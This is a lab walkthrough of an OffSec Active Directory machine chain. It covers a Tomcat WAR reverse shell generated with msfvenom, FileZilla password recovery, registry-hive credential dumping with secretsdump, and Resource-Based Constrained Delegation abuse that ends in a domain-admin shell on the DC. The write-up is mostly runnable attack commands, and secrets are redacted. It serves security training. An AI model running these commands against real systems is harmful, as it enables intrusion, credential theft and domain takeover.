---
tags: [Offsec, RockyColt, Windows, ActiveDirectory, LDAP, Tomcat, FileZilla, BloodHound, RBCD, Delegation, Medium]
platform: OffSec
os: Windows Server / Windows 10
hostname: DC01 / ROCK / COLTY
domain: rockycolt.yzx
difficulty: Lab
ip: $BoxIP
status: Complete
---

# RockyColt, Full Walkthrough

## The gist

RockyColt is a three-host Active Directory chain. Anonymous LDAP exposed the domain users, and the username reused as a password authenticated to Apache Tomcat's HTML Manager on ROCK. A WAR reverse shell landed as the local Administrator, where a FileZilla configuration disclosed a Base64-encoded password for the domain user `cameron`.

The recovered domain account was a local administrator on COLTY. BloodHound then showed that `cameron` had `GenericAll` over DC01, while COLTY and DC01 also had unconstrained delegation enabled. The shorter, more deterministic route was Resource-Based Constrained Delegation: the COLTY machine account was granted permission to impersonate users to DC01, an Administrator service ticket was requested, and the ticket produced an Administrator shell on the domain controller.

## Box information

| Item | Value |
|---|---|
| Platform | OffSec Active Directory lab |
| OS | Windows Server / Windows 10 |
| Hosts | `DC01`, `ROCK`, `COLTY` |
| Domain | `rockycolt.yzx` |
| Difficulty | Lab |
| DC IP | `$BoxIP` |
| ROCK IP | `$BoxIP2` |
| COLTY IP | `$BoxIP3` |

The lab's three IPs were mapped as follows:

| Variable | Host | Role |
|---|---|---|
| `$BoxIP` | `DC01` | Domain controller, LDAP, Kerberos, SMB, WinRM |
| `$BoxIP2` | `ROCK` | Windows host running Apache Tomcat |
| `$BoxIP3` | `COLTY` | Windows member host with SMB and WinRM |

## Variables

```bash
boxset BoxName RockyColt
boxset BoxIP $BoxIP
boxset BoxIP2 $BoxIP2
boxset BoxIP3 $BoxIP3
boxset LocalIP $LocalIP
boxset Domain rockycolt.yzx
boxset FQDN dc01.rockycolt.yzx
boxset DCip $BoxIP
boxset WebPort 8080
boxset Port 4444
boxset Username albert
boxset Username2 cameron
boxset AdminUser Administrator
boxset TargetComputer 'DC01$'
boxset MachineAccount 'COLTY$'
```

Real passwords, NT hashes, Kerberos tickets, and flag values stay in private loot. They are represented by `$Password`, `$Password2`, `$NThash`, and `$ProofFlag` here.

## 1. Map the three-host lab

The initial scan must cover each supplied IP. A normal top-1000 scan would miss the AD ports on the domain controller and the non-standard Tomcat service on ROCK. `-sT` uses a TCP connect scan, which was required in this run because raw SYN sockets were unavailable. `-p-` covers all TCP ports, `--min-rate 3000` keeps the scan quick, and `-oA` saves normal, grepable, and XML output together.

```bash
sudo nmap -sT -p- --min-rate 3000 $BoxIP2 -oA $BoxDir/nmap/rock
sudo nmap -sT -p- --min-rate 3000 $BoxIP -oA $BoxDir/nmap/dc01
sudo nmap -sT -p- --min-rate 3000 $BoxIP3 -oA $BoxDir/nmap/colty
```

ROCK exposed SMB, WinRM, and Tomcat on port 8080. DC01 exposed DNS, Kerberos, LDAP, SMB, LDAPS, the Global Catalog, WinRM, and AD Web Services. COLTY exposed SMB and WinRM but no application service that was needed for the first foothold.

![[rockycolt-1.1nmap-allports.png]]

SCREENSHOT: ROCK's all-port scan. Red should identify 8080 and the Windows management ports. Green should identify that the host is up and the scan covered all TCP ports.

![[rockycolt-1.2nmap-dc01-allports.png]]

SCREENSHOT: DC01's all-port scan. Red should identify LDAP, Kerberos, SMB, WinRM, and Global Catalog ports. Green should identify the domain-controller service pattern.

![[rockycolt-1.3nmap-colty.png]]

SCREENSHOT: COLTY's all-port scan. Red should identify SMB and WinRM, which become useful after credentials are recovered.

> [!tip] ⚡ Efficiency
> Scan all three IPs before spending time on application details. The port pattern immediately separates the DC, the Tomcat host, and the member host, so later commands can use the correct target variable instead of guessing from hostnames.

## 2. Identify ROCK's Tomcat service

After the full scan, version detection was focused on the discovered services. The targeted scan is faster than repeating a full version scan over every port and confirms the Tomcat release and HTTP title.

```bash
sudo nmap -sT -sV -sC \
  -p 135,139,445,5985,8080,8733,47001 \
  $BoxIP2 -oA $BoxDir/nmap/rock-services
```

The important result was Apache Tomcat 8.5.81 on port 8080. The Tomcat landing page and the `/manager` path made the Manager application the first authenticated web check.

```bash
curl -s http://$BoxIP2:$WebPort/ | tee $BoxDir/loot/tomcat-root.html
```

![[rockycolt-2.1nmap-rock-services.png]]

SCREENSHOT: ROCK's service scan. Red should identify Apache Tomcat 8.5.81 on 8080. Green should identify the Windows HTTPAPI and WinRM services.

## 3. Discover the domain with anonymous LDAP

The DC accepted an anonymous LDAP bind. The RootDSE is the best first request because it discloses the naming context, default naming context, and DC DNS name without requiring a guessed base DN.

```bash
ldapsearch -x -H ldap://$BoxIP \
  -s base \
  namingContexts defaultNamingContext dnsHostName \
  | tee $BoxDir/loot/ldap-rootdse.txt
```

The result identified:

```text
Domain: rockycolt.yzx
DC FQDN: dc01.rockycolt.yzx
Base DN: DC=rockycolt,DC=yzx
```

Anonymous RPC and SMB were also checked. They did not provide the useful user list, so LDAP became the primary enumeration source.

```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
smbclient -N -L //$BoxIP
```

![[rockycolt-3.ldap-rootdse.png]]

SCREENSHOT: RootDSE output. Red should identify the default naming context and DC hostname. Green should identify the forest and domain DNS partitions.

## 4. Enumerate LDAP users anonymously

The anonymous subtree query returned the built-in accounts plus two useful domain users. `sAMAccountName` is the short logon name, while `userPrincipalName` gives the domain-qualified form. The usernames were the next credential candidates because the lab description warned that a username was reused as a Tomcat password.

```bash
ldapsearch -x -H ldap://$BoxIP \
  -b 'DC=rockycolt,DC=yzx' \
  '(|(objectClass=user)(objectClass=computer))' \
  sAMAccountName userPrincipalName description \
  | tee $BoxDir/loot/ldap-anon-objects.txt
```

The useful entries were `albert` and `cameron`. I tested the obvious username-as-password combination manually against Tomcat before considering any broader password attack.

![[rockycolt-3.1ldap-users.png]]

SCREENSHOT: Anonymous LDAP user enumeration. Red should identify `albert` and `cameron`. Green should identify the domain-qualified user principals.

> [!warning] 💡 Hint
> Anonymous LDAP returning a small list is still valuable. Preserve the exact `sAMAccountName` values because they may be reused in web credentials, password sprays, Kerberos checks, or configuration files.

## 5. Test the Tomcat Manager credential

Tomcat separates Manager roles. `manager-gui` grants the HTML interface, while `manager-script` grants the text API. This distinction explains the unusual result in this box: `albert:albert` authenticated to the HTML Manager but the text deployment API later returned `403`.

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -u "$Username:$Password" \
  http://$BoxIP2:$WebPort/manager/html
```

The HTML Manager returned `200`. The account was therefore valid and had the GUI role needed for a browser-style deployment.

```bash
boxset Username albert
boxset Password $Password
loot cred $Username $Password
```

> [!warning] 💡 Hint
> A `403` from `/manager/text` does not invalidate a credential that returns `200` from `/manager/html`. Read the Tomcat Manager error page and check the role model before abandoning the account.

> [!tip] ⚡ More efficient path
> Test the most likely username-as-password pair once, then stop when the HTML Manager returns `200`. A wordlist would add authentication noise and would not solve the role mismatch.

## 6. Generate a WAR reverse shell

A WAR is a Java web application archive that Tomcat can deploy. `msfvenom` is allowed here because it only generates the payload. It does not exploit the service or provide the callback by itself.

```bash
msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST=$LocalIP \
  LPORT=$Port \
  -f war \
  -o $BoxDir/exploits/rock.war
```

Before deploying, enumerate the archive so the generated JSP path is known if the context root does not trigger it automatically.

```bash
unzip -l $BoxDir/exploits/rock.war | tee $BoxDir/loot/rock-war-contents.txt
```

## 7. Deploy through the HTML Manager and handle CSRF

The first deployment attempt used the text API because it is normally the fastest Tomcat route:

```bash
curl -s -u "$Username:$Password" \
  --upload-file $BoxDir/exploits/rock.war \
  "http://$BoxIP2:$WebPort/manager/text/deploy?path=/rock&update=true"
```

It returned `403 Access Denied`. The error explained both causes: the account lacked `manager-script`, and Tomcat's Manager access policy and HTML CSRF protection were relevant. The correct response was to use the HTML Manager form as an authenticated session.

First, save the page, session identifier, and CSRF nonce:

```bash
curl -si -u "$Username:$Password" \
  "http://$BoxIP2:$WebPort/manager/html" \
  -c $BoxDir/loot/tomcat-cookies.txt \
  -o $BoxDir/loot/tomcat-manager.html

JSESSION=$(grep -o 'jsessionid=[A-F0-9]*' $BoxDir/loot/tomcat-manager.html | head -1 | cut -d= -f2)
CSRF=$(grep -o 'CSRF_NONCE=[A-F0-9]*' $BoxDir/loot/tomcat-manager.html | head -1 | cut -d= -f2)
```

Then submit the multipart upload to the exact HTML upload endpoint:

```bash
curl -s -u "$Username:$Password" \
  -b "JSESSIONID=$JSESSION" \
  -F "deployWar=@$BoxDir/exploits/rock.war;type=application/octet-stream" \
  "http://$BoxIP2:$WebPort/manager/html/upload;jsessionid=$JSESSION?org.apache.catalina.filters.CSRF_NONCE=$CSRF" \
  -o $BoxDir/loot/tomcat-upload-response.html

grep -i 'OK\|error\|rock\|deploy\|fail' \
  $BoxDir/loot/tomcat-upload-response.html | head
```

The response returned `OK` and the Manager listed `/rock` as a running application.

> [!warning] 💡 Gotcha
> Do not keep retrying the text API after a role-specific `403`. Determine whether the account has `manager-gui` or `manager-script`. A GUI-only account requires the HTML upload form and a current CSRF nonce.

> [!tip] ⚡ More efficient path
> In a normal Tomcat deployment, the text API is one command. On this box, reading the role error immediately saved time: the HTML Manager path was the correct alternative, and the page already exposed the upload action and nonce.

## 8. Catch the Tomcat shell

The listener must be running before the application is requested. The WAR generated by `msfvenom` can be triggered at the deployed context root. If the root does not invoke the generated JSP, use the JSP filename shown by `unzip -l`.

```bash
nc -lvnp $Port
```

In another terminal:

```bash
curl -s "http://$BoxIP2:$WebPort/rock/"
```

The callback landed as the local account:

```text
rock\administrator
```

The shell identity mattered more than the Tomcat version. The process was already running with local Administrator rights, so the first foothold did not require a separate local privilege-escalation exploit.

```cmd
whoami
hostname
ipconfig
```

![[rockycolt-4.tomcat-shell.png]]

SCREENSHOT: Reverse shell from Tomcat. Red should identify the Windows command prompt and the callback. Green should identify the Tomcat process context.

![[rockycolt-5.whoami-rock.png]]

SCREENSHOT: `whoami` from ROCK. Red should identify `rock\administrator`. Green should identify that this is a local account, not the domain Administrator.

## 9. Confirm the ROCK user proof and inspect local configuration

The local proof file was found under Albert's profile:

```cmd
dir C:\Users\albert\Desktop
type C:\Users\albert\Desktop\local.txt
```

The value was recorded privately with the loot helper and is intentionally omitted here:

```bash
loot flag user $UserFlag
```

The next useful task was credential search. The lab description specifically mentioned FileZilla, so the user's roaming profile was checked directly rather than searching every file on disk.

```cmd
dir C:\Users\Administrator\AppData\Roaming\FileZilla
type C:\Users\Administrator\AppData\Roaming\FileZilla\filezilla.xml
```

The XML contained a saved site entry for `cameron` connecting to COLTY. The `<Pass encoding="base64">` value was decoded offline. The cleartext password is stored only in private loot and is represented by `$Password2` in this page.

```bash
printf '%s' "$EncodedPassword" | base64 -d
boxset Username2 cameron
boxset Password2 $Password2
loot cred $Username2 $Password2
```

SCREENSHOT: FileZilla XML evidence. Red should identify the COLTY host, username, and Base64 encoding label. Keep the source image in private loot because the encoded value is still credential material.

> [!warning] 💡 Hint
> Search the profile named in the configuration, not only the profile that owns the first shell. A service running as local Administrator can read other local users' roaming configuration, and the saved FTP entry pointed directly at the next host.

## 10. Optional stable shell using the local Administrator hash

The initial command shell was enough to read FileZilla, but the run also demonstrated a stable Evil-WinRM path. Because the shell had local Administrator rights, the SAM and SYSTEM hives were saved and parsed locally. This is an optional operational improvement, not a separate vulnerability.

On ROCK:

```cmd
reg save HKLM\SAM C:\Windows\Temp\sam.hiv
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
net share temp=C:\Windows\Temp /grant:everyone,full
```

From Kali, download the hives and parse the local SAM:

```bash
smbclient //$BoxIP2/temp -N \
  -c "get sam.hiv $BoxDir/loot/sam.hiv; get system.hiv $BoxDir/loot/system.hiv"

secretsdump.py \
  -sam $BoxDir/loot/sam.hiv \
  -system $BoxDir/loot/system.hiv \
  LOCAL | tee $BoxDir/loot/rock-local-secretsdump.log
```

The local Administrator NT hash was kept private as `$AdminHash`. It was validated with SMB and used for an Evil-WinRM session to ROCK:

```bash
smbclient //$BoxIP2/temp -U "$AdminUser" --pw-nt-hash $AdminHash
evil-winrm -i $BoxIP2 -u $AdminUser -H $AdminHash
```

> [!warning] 💡 Gotcha
> Do not confuse `rock\administrator` with `rockycolt.yzx\Administrator`. The first is a local account on ROCK. The domain Administrator service ticket is obtained later through RBCD.

## 11. Validate Cameron on COLTY

The FileZilla password was tested against both SMB and WinRM. NetExec is efficient here because it reports authentication and administrative access in one line, while still allowing each protocol to be tested explicitly.

```bash
nxc smb $BoxIP3 -u $Username2 -p $Password2 -d $Domain
nxc winrm $BoxIP3 -u $Username2 -p $Password2 -d $Domain
```

Both services authenticated successfully, and SMB reported administrative access. The interactive foothold was opened with Evil-WinRM:

```bash
evil-winrm -i $BoxIP3 -u $Username2 -p $Password2
```

Inside COLTY:

```powershell
whoami /all
hostname
ipconfig
```

The token showed `BUILTIN\Administrators` and a high-integrity session. The account was therefore suitable for collecting local registry hives.

SCREENSHOT: Cameron's WinRM validation. Red should identify the successful domain authentication. Green should identify COLTY and WinRM as the usable foothold. Keep the source image private because the command line displays the password.

> [!tip] ⚡ More efficient path
> Test SMB and WinRM immediately after recovering a domain credential. SMB's `Pwn3d!` result distinguishes a valid login from local administrator access, while WinRM tells you whether an interactive shell is available.

## 12. Collect BloodHound data and identify the AD path

BloodHound maps relationships that are easy to miss in raw LDAP output. The Python collector runs remotely from Kali, so no SharpHound executable needs to be placed on the target.

```bash
bloodhound-python \
  -u $Username2 \
  -p $Password2 \
  -d $Domain \
  -ns $BoxIP \
  -c All \
  --zip \
  -op $BoxDir/loot/
```

The collector found the domain, three computers, seven users, groups, GPOs, OUs, and containers. The Kerberos TGT warning occurred because `dc01.rockycolt.yzx` was not resolvable at that moment. LDAP collection still completed over the DC IP.

The computer data showed:

- COLTY had `TrustedForDelegation` enabled, meaning unconstrained delegation.
- DC01 also had unconstrained delegation enabled.
- Cameron's SID had `GenericAll` over the DC01 computer object.

There were two possible escalation theories:

1. Use unconstrained delegation on COLTY, coerce a privileged authentication to COLTY, and capture a delegated ticket. This is more timing-sensitive and depends on coercion and ticket capture working cleanly.
2. Use Cameron's `GenericAll` over DC01 to set `msDS-AllowedToActOnBehalfOfOtherIdentity`, then use the COLTY computer account for RBCD. This is direct, deterministic, and only needs the COLTY machine secret.

The second path was selected.

SCREENSHOT: BloodHound collection. Red should identify the domain and computer enumeration success. Green should identify that the dataset was collected remotely from Kali. Keep the source image private because the command line displays the credential.

> [!warning] 💡 Hint
> BloodHound is not only for long attack-path graphs. Search the target computer's ACLs for `GenericAll`, `GenericWrite`, `WriteDacl`, and delegation properties. A direct object right can be shorter than a group-membership chain.

## 13. Extract the COLTY machine-account secret

RBCD needs a service account that can request Kerberos service tickets. The existing `COLTY$` computer account was suitable, and Cameron's local Administrator access allowed the machine's registry secrets to be exported.

From the COLTY Evil-WinRM session:

```powershell
reg save HKLM\SAM C:\Temp\SAM /y
reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
reg save HKLM\SECURITY C:\Temp\SECURITY /y
download C:\Temp\SAM
download C:\Temp\SYSTEM
download C:\Temp\SECURITY
```

Parse the hives locally. `-system` supplies the boot key, `-sam` supplies local account hashes, and `-security` allows LSA secrets, including the machine account secret, to be recovered.

```bash
secretsdump.py \
  -sam $BoxDir/loot/SAM \
  -system $BoxDir/loot/SYSTEM \
  -security $BoxDir/loot/SECURITY \
  LOCAL | tee $BoxDir/loot/colty-secretsdump.log
```

The output exposed the `COLTY$` machine-account NT hash. It is represented by `$NThash` below and is not included in the vault.

![[rockycolt-9.colty-reg-save.png]]

SCREENSHOT: Registry hive export from COLTY. Red should identify SAM, SYSTEM, and SECURITY being saved. Green should identify that the action is performed from a local Administrator token.

![[rockycolt-10.colty-hive-download.png]]

SCREENSHOT: Hive download. Red should identify the three files transferred to Kali. Do not expose their contents in a shared note.

SCREENSHOT: Keep this screenshot in private loot only because it contains hashes. In the vault, document the command and result without embedding the image.

> [!warning] 💡 Gotcha
> A computer account name ends in `$`. Preserve that suffix in the identity passed to Kerberos tooling. It is not an ordinary user account.

## 14. Abuse GenericAll with Resource-Based Constrained Delegation

Resource-Based Constrained Delegation, or RBCD, stores the list of accounts allowed to act on behalf of users to a target computer. The target computer controls this list through `msDS-AllowedToActOnBehalfOfOtherIdentity`.

Because Cameron had `GenericAll` over DC01, Cameron could modify the DC01 computer object. The first two attempts used `bloodyAD set object` with incorrect syntax and failed. The working abstraction was the tool's dedicated `add rbcd` command:

```bash
bloodyAD \
  -u $Username2 \
  -p $Password2 \
  -d $Domain \
  --host $BoxIP \
  add rbcd \
  $TargetComputer \
  $MachineAccount \
  | tee $BoxDir/loot/rbcd-add.log
```

The result confirmed that `COLTY$` could impersonate users to `DC01$` via S4U2Proxy. This is the critical authorization change that turns the COLTY machine secret into a path to the DC.

SCREENSHOT: Keep this screenshot in private loot because the command line contains a credential. The vault records the successful RBCD result without embedding the image.

> [!warning] 💡 Gotcha
> If a short target name cannot be resolved, use the computer account form with the trailing `$` or the full distinguished name. If `set object` tries to encode `COLTY$` as a security descriptor, use `add rbcd`, which builds the descriptor correctly.

## 15. Request an Administrator service ticket

`getST.py` performs the Kerberos S4U chain. It first obtains a ticket for the service account, performs S4U2Self to request a ticket on behalf of Administrator, then performs S4U2Proxy to obtain a ticket to the CIFS service on DC01.

```bash
getST.py \
  -spn "cifs/$FQDN" \
  -impersonate $AdminUser \
  -dc-ip $BoxIP \
  "$Domain/$MachineAccount" \
  -hashes ":$NThash" \
  | tee $BoxDir/loot/getST.log
```

Successful output showed:

```text
Getting TGT for user
Impersonating Administrator
Requesting S4U2self
Requesting S4U2Proxy
Saving ticket in Administrator.ccache
```

The ticket cache was moved into loot and used for Kerberos authentication.

SCREENSHOT: Keep this screenshot in private loot because the command line contains the machine hash. The useful vault-level evidence is the successful S4U2Self, S4U2Proxy, and ccache creation.

## 16. Use the ticket against DC01

The first WMI attempt failed because the DC FQDN did not resolve locally. That failure was DNS, not an RBCD or Kerberos failure. Add the DC mapping before using ticket-based tools:

```bash
echo "$BoxIP $FQDN dc01" | sudo tee -a /etc/hosts
```

Then load the ccache and open a WMI shell:

```bash
KRB5CCNAME=$BoxDir/loot/Administrator.ccache \
wmiexec.py -k -no-pass $FQDN \
  | tee $BoxDir/loot/dc01-whoami.log
```

The shell confirmed:

```text
rockycolt\administrator
```

The Administrator token included Domain Admins, Enterprise Admins, and Schema Admins. This demonstrated domain compromise rather than only local Administrator access.

```cmd
whoami /all
hostname
```

![[rockycolt-14.dc01-wmiexec-shell.png]]

SCREENSHOT: DC01 WMI shell. Red should identify `rockycolt\administrator`. Green should identify the Kerberos-backed shell and DC hostname.

## 17. Retrieve the DC proof

The DC profile was versioned, so a hard-coded `C:\Users\Administrator\Desktop` path failed. Enumerating the profile names first exposed the correct `Administrator.DC01` profile and its versioned desktop.

```cmd
dir C:\Users
dir C:\Users\Administrator.DC01*\Desktop
type C:\Users\Administrator.DC01.V6\Desktop\proof.txt
```

The proof value was recorded privately. It is represented by `$ProofFlag` here.

SCREENSHOT: Keep this image in private loot only because it contains the proof value. The vault records the path and successful retrieval without embedding the value.

> [!warning] 💡 Hint
> Profile suffixes such as `.DC01` and `.V6` are normal Windows profile artifacts. When an expected Administrator path fails, enumerate `C:\Users` and use the actual profile directory rather than assuming the unsuffixed name.

## 18. Clean-down and verification

The run created three classes of temporary state: the Tomcat WAR, the registry hives, and the RBCD authorization. Remove the delegation before treating the machine account as clean, and remove the WAR through the HTML Manager because the text API role was unavailable.

Remove the temporary hives from COLTY:

```powershell
Remove-Item -Force `
  C:\Temp\SAM,
  C:\Temp\SYSTEM,
  C:\Temp\SECURITY
```

Remove the RBCD entry:

```bash
bloodyAD \
  -u $Username2 \
  -p $Password2 \
  -d $Domain \
  --host $BoxIP \
  remove rbcd \
  $TargetComputer \
  $MachineAccount
```

The tool confirmed that COLTY could no longer impersonate users on DC01.

For Tomcat, return to `/manager/html`, extract a fresh CSRF nonce, and POST the HTML Manager's undeploy action for `/rock`. A stale direct request to `/manager/html/undeploy?path=/shell` returned `403`, so the exact current form action and nonce must be used.

```bash
curl -s -u "$Username:$Password" \
  "http://$BoxIP2:$WebPort/manager/html" \
  -o $BoxDir/loot/tomcat-clean.html

CleanURL=$(grep -o 'action="[^"]*path=&#47;rock[^"]*"' \
  $BoxDir/loot/tomcat-clean.html | head -n 1 | \
  sed 's/^action="//; s/"$//; s|&#47;|/|g; s|&amp;|\&|g')

# Submit the current form action and its hidden CSRF nonce.
curl -s -u "$Username:$Password" -X POST \
  "http://$BoxIP2:$WebPort$CleanURL" \
  -o $BoxDir/loot/tomcat-clean-response.html

curl -s -o /dev/null -w '%{http_code}\n' \
  "http://$BoxIP2:$WebPort/rock/"
```

The corrected undeploy returned `OK`, and the old application path returned `404`. The manual run was then closed with:

```bash
boxdone
```

## Technical gotchas and corrections

1. **The three IPs are different hosts.** `$BoxIP` is DC01, `$BoxIP2` is ROCK, and `$BoxIP3` is COLTY. Treating the supplied IP1 as the only target would miss the Tomcat and lateral-movement stages.
2. **Manager role mismatch.** `albert` had `manager-gui`, not `manager-script`. The text API `403` was expected. The HTML upload form and CSRF nonce were the correct route.
3. **Local versus domain Administrator.** `rock\administrator` came from Tomcat on ROCK. `rockycolt\administrator` came from the RBCD-generated Kerberos ticket on DC01.
4. **Hash parsing version mismatch.** The Kali Impacket wrapper and Python library initially disagreed. The system Impacket example was used with `PYTHONPATH=/usr/lib/python3/dist-packages` when necessary.
5. **RBCD command syntax.** `set object --value` was invalid, and the `-v` form tried to treat a raw account name as a security descriptor. `bloodyAD add rbcd` handled the descriptor construction.
6. **Kerberos name resolution.** `getST.py` succeeded, but WMI failed until `dc01.rockycolt.yzx` was added to `/etc/hosts`.
7. **Versioned profiles.** The DC Administrator profile had a suffix, so the proof path had to be enumerated rather than guessed.
8. **Cleanup path mismatch.** The first undeploy request targeted `/shell` and lacked a current CSRF token. The correct application was `/rock`, and cleanup required a fresh HTML Manager form action.

## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/AD - Service Scan]] -- identified the domain controller services, host roles, and Tomcat member host
- [[RUNBOOK V2/AD - Anonymous Enum]] -- anonymous LDAP, RPC, and SMB checks
- [[RUNBOOK V2/AD - Web Enum]] -- Tomcat Manager and application enumeration
- [[RUNBOOK V2/Windows - Web - Tomcat]] -- Manager credential testing, WAR upload, CSRF handling, and shell delivery
- [[RUNBOOK V2/Windows - Shell Received]] -- confirmed the ROCK Windows shell identity
- [[RUNBOOK V2/AD - Credential Validation]] -- validated Cameron over SMB and WinRM
- [[RUNBOOK V2/AD - WinRM Foothold]] -- opened the COLTY administrative shell
- [[RUNBOOK V2/AD - Privilege Triage]] -- confirmed COLTY administrative token privileges
- [[RUNBOOK V2/AD - Local Credential Search]] -- guided the FileZilla credential search
- [[RUNBOOK V2/Windows - Registry Hive Extraction]] -- saved and parsed SAM, SYSTEM, and SECURITY hives
- [[RUNBOOK V2/AD - BloodHound]] -- identified GenericAll and delegation properties
- [[RUNBOOK V2/AD - Resource-Based Constrained Delegation]] -- configured RBCD and requested the S4U ticket
- [[RUNBOOK V2/AD - Pass the Hash]] -- documented hash-based authentication concepts used during the chain
- [[RUNBOOK V2/AD - Clean Down]] -- removed RBCD and temporary files
- [[RUNBOOK V2/Windows - Clean Down]] -- removed the Tomcat application and verified 404

## Attack Chain

1. Full scans separated DC01, ROCK, and COLTY.
2. Anonymous RootDSE and LDAP queries disclosed the domain and users.
3. `albert:albert` authenticated to the Tomcat HTML Manager.
4. A generated WAR provided a shell as ROCK's local Administrator.
5. FileZilla disclosed Cameron's saved password for COLTY.
6. Cameron authenticated to COLTY as a local administrator.
7. BloodHound showed Cameron's GenericAll over DC01 and delegation properties.
8. COLTY's machine secret was recovered from local registry hives.
9. RBCD allowed COLTY$ to impersonate Administrator to DC01.
10. `getST.py` produced an Administrator ccache, and WMI confirmed domain Administrator execution on DC01.
11. The DC proof was retrieved, then RBCD, hives, and the WAR were cleaned up.

## Credentials

| Account | Source | Use |
|---|---|---|
| `albert` | Anonymous LDAP username reused as password | Tomcat HTML Manager |
| Local `administrator` on ROCK | Local SAM extracted from ROCK | Stable Evil-WinRM session on ROCK |
| `cameron` | FileZilla XML on ROCK | SMB and WinRM access to COLTY |
| `COLTY$` | COLTY SAM, SYSTEM, and SECURITY hives | RBCD service account |
| Domain `Administrator` | S4U2Proxy impersonation | DC01 proof retrieval |

Passwords, hashes, and Kerberos ticket contents are intentionally omitted.

## Flags and proof

- `local.txt`: `$UserFlag` from the ROCK user profile
- `proof.txt`: `$ProofFlag` from the versioned DC Administrator profile

Values remain in private loot only.

## Key lessons

- Anonymous LDAP may expose enough users to unlock an unrelated web management service.
- Tomcat Manager roles matter. `manager-gui` and `manager-script` are not interchangeable.
- FileZilla's `encoding="base64"` is reversible storage, not encryption.
- BloodHound should be used to inspect computer-object ACLs and delegation flags, not only group paths.
- RBCD is often more deterministic than unconstrained delegation when GenericAll over a computer object is available.
- Registry hives can recover local account and machine-account secrets when the current token is local Administrator.
- Kerberos tooling needs working DNS names even when the DC IP is reachable.
- Remove temporary delegation before cleanup is considered complete.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- anonymous AD enumeration, ACL abuse, and DCSync concepts
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- credential discovery, BloodHound, DCSync, and pass-the-hash
- [[OSCP/BOXES/WRITE UPS/AD/Return|Return]] -- Windows foothold and privilege triage
- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- Tomcat Manager WAR deployment
- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- source review, staged shell delivery, and cleanup discipline

## External Resources

- [Apache Tomcat 8.5 Manager App HOW-TO](https://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html)
- [HackTricks: Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
- [iRed.Team: Resource-Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- [Microsoft: msDS-AllowedToActOnBehalfOfOtherIdentity](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
- [BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
- [Impacket](https://github.com/fortra/impacket)
- [Devolutions: Anonymous LDAP binds](https://blog.devolutions.net/2021/03/why-active-directory-ldap-unauthenticated-binds-should-be-disabled-and-how-to-do-it/)

## Checklist

- [x] Full TCP scan of DC01, ROCK, and COLTY
- [x] Tomcat version and Manager path identified
- [x] Anonymous LDAP RootDSE and user enumeration completed
- [x] Tomcat username-as-password authentication confirmed
- [x] WAR reverse shell generated and uploaded through the HTML Manager
- [x] ROCK local Administrator shell received
- [x] ROCK user proof path confirmed
- [x] FileZilla Base64 credential recovered
- [x] Cameron validated over SMB and WinRM on COLTY
- [x] BloodHound data collected and GenericAll confirmed
- [x] COLTY machine-account secret recovered from registry hives
- [x] RBCD configured and S4U2Proxy ticket obtained
- [x] Domain Administrator execution confirmed on DC01
- [x] DC proof path confirmed
- [x] Temporary hives removed
- [x] RBCD removed
- [x] Tomcat application undeployed and old path verified with 404
- [x] `boxdone` recorded in the manual run
